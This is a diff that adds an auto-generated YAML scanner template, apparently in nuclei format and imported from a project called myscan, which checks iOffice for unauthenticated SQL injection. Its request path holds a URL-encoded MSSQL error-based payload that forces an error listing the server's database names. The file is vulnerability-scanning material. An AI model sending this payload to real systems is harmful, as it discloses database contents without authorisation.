@@ -1,0 +1,23 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-ioffice-unauth_sql_injection2
+info:
+  name: "iOffice unauth_sql_injection2"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, ioffice, ref-poc, sqlinjection]
+  description: "由参考项目脚本静态导入：iOffice/unauth_sql_injection2（类型 SQLINJECTION）。"
+http:
+  - method: GET
+    path:
+      - "/"
+      - "/api/switch-value/list?sorts=%5B%7B%22Field%22:%22convert(int,stuff((select%20quotename(name)%20from%20sys.databases%20for%20xml%20path(%27%27),1,0,%27%27))%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c5c89905a7)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "iOffice.net"
+          - "错误的请求"
